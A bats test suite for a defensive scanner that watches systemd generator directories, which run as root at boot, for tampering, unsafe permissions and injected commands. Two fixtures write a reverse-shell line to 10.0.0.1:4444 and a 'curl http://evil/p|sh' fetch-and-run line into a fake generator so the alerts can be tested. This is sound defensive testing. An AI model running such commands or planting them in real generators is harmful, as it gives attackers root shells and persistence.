#!/usr/bin/env bats
# L2 bats functional tests for the systemd-generator-watchdog scan script.
#
# systemd runs the executables in its generator dirs (system-generators /
# user-generators) AS ROOT very early at every boot and on `daemon-reload`,
# before most services start — one of the earliest, most powerful root-exec
# surfaces (T1546). A generator that is world-writable / non-root-owned, or a
# text generator containing a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-systemd-generator-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd/systemd-generator-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    GEND="${TMP}/system-generators"; mkdir -p "${GEND}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SDGEN_PROFILE="${PROFILE:-report}" \
    SELFDEF_SDGEN_BASELINE="${BASELINE}" \
    SELFDEF_SDGEN_DIRS="${DIRS_V:-$GEND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# systemd-fstab-generator shim\nexit 0\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
}

@test "no generator dirs → ok / no_generator_dirs" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_generator_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign generator, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged generators on second run → ok / systemd_generator_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a generator containing an injection pattern → alert / systemd_generator_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable generator → alert" {
    seed_benign
    run_wd
    chmod 0666 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign generator change → warn / systemd_generator_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# updated shim\ntrue\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"systemd_generator_(changed|new)"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned generator is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious generator" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
